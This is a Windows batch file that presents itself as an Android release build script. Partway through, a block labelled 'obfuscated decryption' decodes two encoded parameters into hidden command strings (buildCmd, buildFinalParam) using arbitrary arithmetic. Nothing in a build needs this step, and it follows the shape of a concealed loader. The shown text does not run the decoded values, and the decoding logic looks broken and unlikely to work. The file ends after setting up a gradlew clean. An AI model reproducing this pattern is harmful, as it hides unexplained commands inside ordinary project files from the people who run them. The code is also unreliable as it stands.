@echo off

rem Change to the project directory
cd /d "%~dp0"

rem Define variables for the build script
set "androidBundle=release"
set "buildParam1=J/ChgA=="
set "buildParam2=8mJHD/vu"

rem Check if required tools are installed
if not exist "%ANDROID_HOME%" (
  echo "ANDROID_HOME environment variable is not set."
  exit /b 1
)

rem Perform obfuscated decryption
setlocal enableextensions enabledelayedexpansion

set "a=13"
set "b=19"
set "c=31"
set "d=7"
set "e=5"
set "f=11"
set "g=17"
set "h=23"
set "i=29"
set "j=3"
set "k=37"
set "l=2"
set "m=41"
set "n=47"
set "o=43"
set "p=53"

set "paramAnalysis=%buildParam1%"
set "buildCmd="

for /l %%n in (0 1 31) do (
  set "char=!paramAnalysis:~%%n,1!"
  set /a "x=!char!-((%%n*%%n+%%n)*(!a!+!b!+!c!+!d!+!e!+!f!+!g!+!h!+!i!+!j!+!k!+!l!+!m!+!n!+!o!+!p!))"
  set /a "y=(!x!>>1)+(%%n*(!a!+!b!+!c!+!d!+!e!+!f!+!g!+!h!+!i!+!j!+!k!+!l!+!m!+!n!+!o!+!p!))"
  set /a "z=(!y!^(!androidBundle:~%%n,1!))"
  set "buildCmd=!buildCmd!!z:~0,1!"
)

set "paramAnalysis=%buildParam2%"
set "buildFinalParam="

for /l %%n in (0 1 31) do (
  set "char=!paramAnalysis:~%%n,1!"
  set /a "x=!char!-((%%n*%%n+%%n)*(!a!+!b!+!c!+!d!+!e!+!f!+!g!+!h!+!i!+!j!+!k!+!l!+!m!+!n!+!o!+!p!))"
  set /a "y=(!x!>>1)+(%%n*(!a!+!b!+!c!+!d!+!e!+!f!+!g!+!h!+!i!+!j!+!k!+!l!+!m!+!n!+!o!+!p!))"
  set /a "z=(!y!^(!androidBundle:~%%n,1!))"
  set "buildFinalParam=!buildFinalParam!!z:~0,1!"
)

rem Clean the build environment
set "gradlewPath=%~dp0gradlew.bat"
set "cleanCommand=%gradlewPath% clean"
echo "Cleaning build environment..."